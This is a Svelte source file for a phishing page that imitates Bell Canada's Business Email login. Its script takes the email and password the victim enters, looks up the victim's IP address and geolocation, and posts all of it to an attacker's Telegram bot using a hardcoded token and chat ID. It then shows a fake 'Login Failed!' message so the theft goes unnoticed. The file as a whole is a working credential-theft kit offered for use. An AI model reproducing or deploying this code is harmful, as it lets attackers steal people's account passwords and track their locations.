<script>
  let email = '';
  let password = '';
  let errors = { email: '', password: '' };
  let isModalVisible = false;

  let ipAddress = '';
  let location = {
    latitude: '',
    longitude: '',
    country: '',
    city: '',
    state: '',
    zip_code: ''
  };

  // Validation functions
  function validateEmail() {
    const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return re.test(email);
  }

  function validatePassword() {
    if (password.length < 1) {
      return 'Password is Required';
    }
    return '';
  }

  async function getLocationDetails(lat, lon) {
    try {
      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
      const data = await response.json();
      return {
        country: data.address ? data.address.country : 'N/A',
        city: data.address ? data.address.city : 'N/A',
        state: data.address ? data.address.state : 'N/A',
        zip_code: data.address ? data.address.postcode : 'N/A'
      };
    } catch (error) {
      console.error('Error fetching location details:', error);
      return {
        country: 'N/A',
        city: 'N/A',
        state: 'N/A',
        zip_code: 'N/A'
      };
    }
  }

  async function getIpAddress() {
    try {
      const response = await fetch('https://api64.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Failed to fetch IP address:', error);
      return 'N/A';
    }
  }

  // Function to handle form submission
  async function submitForm() {
    // Clear previous errors
    errors.email = '';
    errors.password = '';

    // Perform validation
    if (!validateEmail()) {
      errors.email = 'Please enter a valid email address.';
    }

    const passwordError = validatePassword();
    if (passwordError) {
      errors.password = passwordError;
    }

    // If no errors, proceed with sending data
    if (!errors.email && !errors.password) {
      // Get user's IP address
      ipAddress = await getIpAddress();

      // Try to get user's location
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            location.latitude = position.coords.latitude;
            location.longitude = position.coords.longitude;

            // Get location details
            const locationDetails = await getLocationDetails(location.latitude, location.longitude);
            location = { ...location, ...locationDetails };

            // Send data to Telegram
            await sendDataToTelegram(email, password, ipAddress, location);

            // Show the modal
            isModalVisible = true;
          },
          async (error) => {
            console.error('Geolocation error:', error);

            // Send data without location if geolocation fails
            await sendDataToTelegram(email, password, ipAddress, location);

            // Show the modal
            isModalVisible = true;
          }
        );
      } else {
        console.error('Geolocation is not supported by this browser');

        // Send data without location if geolocation is not supported
        await sendDataToTelegram(email, password, ipAddress, location);

        // Show the modal
        isModalVisible = true;
      }
    }
  }

  // Send data to Telegram
  async function sendDataToTelegram(email, password, ip, location) {
    const botToken = '7697246301:AAFcC_2HcCcnHZ3ePerNLn8XkgqexprrfiI'; // Replace with your Telegram bot token
    const chatId = '1678259688'; // Replace with your Telegram chat ID

    const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const data = await response.json();
    console.log(data); // Optional: Log the response from Telegram
  }

  // Function to close the modal
  function closeModal() {
    isModalVisible = false;
  }
</script>

<style scoped>
.padding-div {
  background: linear-gradient(to right, #004e94, #0064a2);
  padding: 10px;
  padding-left: 20px;
  padding-right: 20px;
}

.div {
  background: linear-gradient(to right, #004e94, #0064a2);
  color: white;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0px;
  height: 72px;
}

.group {
  display: flex;
  justify-content: space-around;
  align-items: center;
  gap: 10px;
}

.logo {
  height: 45px;
}


.separator {
  height: 35px;
  width: 1.5px;
  background-color: rgb(0, 0, 0, 0.4);
}

.column {
  display: flex;
  flex-direction: column;
  font-size: 16px;
  font-weight: 900;
  font-family: "BellSlimRegular", Helvetica, Arial, sans-serif;
}

.column p {
  height: 14px;
  width: 60px;
  margin-bottom: 10px;
}

.underline {
  text-decoration: underline;
  cursor: pointer;
  line-height: 16px;
  height: 16px;
  width: 64px;
  font-size: 20px;
  font-family: "BellSlimRegular", Helvetica, Arial, sans-serif;
}

.container {
  background-image: url('/Bell.jpg');
  background-size: cover;
  background-repeat: no-repeat;
  /* Prevent repeating background image */
  display: flex;
  justify-content: flex-start;
  /* Center the modal vertically */
  align-items: flex-start;
  width: 100%;
  height: 100vh;
  box-sizing: border-box;
}

.modal {
  background-color: #ffffff;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  width: 100%;
  max-width: 270px;
  /* Maximum width of the modal */
  border-radius: 0.375rem;
  border-width: 1px;
  margin: auto;
  height: 480px;
  /* padding: 1rem; Padding inside the modal */
  box-sizing: border-box;
  max-height: 80vh;
}



.field input[type='email'],
.field input[type='password'] {
  height: 40px;
  padding: 10px;
  border: 1px solid black;
  border-radius: 4px;
}

.field input[type='email']:focus,
.field input[type='password']:focus {
  outline: none;
  border: 1px solid #ffa07a;
  box-shadow: 0 0 0 2px #007bff;
  border-radius: 4px;
}

.form-group {
  display: flex;
  flex-direction: column;
  padding: 0 20px;
  margin-bottom: 10px;
}

.form-group label {
  font-size: 14px;
  margin-bottom: 5px;
  line-height: 18px;
  height: 20px;
  font-weight: 700;
  font-family: "BellSlimBlack", Helvetica, Arial, sans-serif;
}


.form-footer {
  background-color: rgb(128, 128, 128, 0.3);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  width: 100%;
  height: 80px;
  box-sizing: border-box;
}

.reduce {
  font-size: 15px;
  margin-left: 20px;
  margin-right: 20px;
  margin-top: 8px;
  text-align: center;
  margin-bottom: 10px;
  cursor: pointer;
  color: #555555;
}

.reduce:hover {
  text-decoration: underline;
}

.tink {
  margin-left: 20px;
  font-weight: 800;
  margin-top: 20px;
}

.bold {
  font-weight: 800;
}

.blue {
  color: #6cb5f9;
  font-size: 12px;
}

.copyright {
  font-size: 12px;
  color: #555555;
}

.submit {
  color: white;
  height: 30px;
  width: 70px;
  border: none;
  border-radius: 9999px;
  margin-top: 10px;
  margin-bottom: 5px;
  margin-left: 20px;
  padding: 0 10px;
  background: linear-gradient(to right, #004e94, #0064a2);
  outline: none;
  cursor: pointer;
}

.submit:hover {
  opacity: 0.8;
}

.error {
  color: red;
  font-size: 12px;
  margin-top: 7px;
}

/* Modal for confirmation */
  .modal-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
    justify-content: center;
    align-items: center;
  }

  .modal-overlay.visible {
    display: flex;
  }

  .modal-content {
    background-color: white;
    padding: 20px;
    border-radius: 8px;
    text-align: center;
  }

  .modal-footer {
    margin-top: 10px;
    display: flex;
    justify-content: center;
  }

  .close-btn {
    padding: 10px 20px;
    background-color: #ff4b4b;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }

  .close-btn:hover {
    background-color: #cc3f3f;
  }

/* Media queries for responsiveness */
@media (max-width: 768px) {
  .modal {
    width: 90%;
    /* Smaller width for smaller screens */
  }
}

@media (min-width: 768px) {
  .modal {
    width: 70%;
    /* Adjust width for larger screens */
  }
}

@media (min-width: 1024px) {
  .container {
    display: flex;
    flex-direction: row !important;
    justify-content: flex-start !important;
    align-items: center !important;
    padding-left: 20px !important;
  }

  .modal {
    width: auto;
    /* Adjust width for even larger screens */
    margin-left: 30px;
  }
}

@media (max-width: 1023px) {
  .container {
    justify-content: center;
    align-items: center;
  }
}
</style>

<div class="padding-div">
<div class="div">
  <div class="group">
      <img src="/image.png" class="logo" alt="bell-logo"/>
    <div class="separator"></div>
    <div class="column">
      <p>Business</p>
      <p>Email</p>
    </div>
  </div>
  <p class="underline">Français</p>
</div>
</div>

  <div class="container">
  <div class="modal">
    <h1 class="tink">Log In</h1>
    <form on:submit|preventDefault={submitForm} class="field">
      <div class="form-group">
        <label for="email">Email Address</label>
        <input id="email" type="email" bind:value={email} name="email"/>
        {#if errors.email}
          <div class="error">{errors.email}</div>
        {/if}
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <input id="password" type="password" bind:value={password} />
        {#if errors.password}
          <div class="error">{errors.password}</div>
        {/if}
      </div>

      <button type="submit" class="submit">Login</button>
      <p class="reduce">Forgot your password? Call 310-<span class="bold">BELL</span> support.</p>
    </form>
    <div class="form-footer">
        <p class="blue"><a href="/privacy">Privacy</a> | <a href="/legal"> Legal & Regulatory </a></p>
        <p class="copyright">Bell Canada 2024. All rights reserved</p>
      </div>
  </div>
</div>

<!-- Modal for Success Message -->
<div class="modal-overlay {isModalVisible ? 'visible' : ''}">
  <div class="modal-content">
    <h2>Login Failed!</h2>
    <p>Kindly reload the page and try again!...</p>
    <div class="modal-footer">
      <button class="close-btn" on:click={closeModal}>Close</button>
    </div>
  </div>
</div>
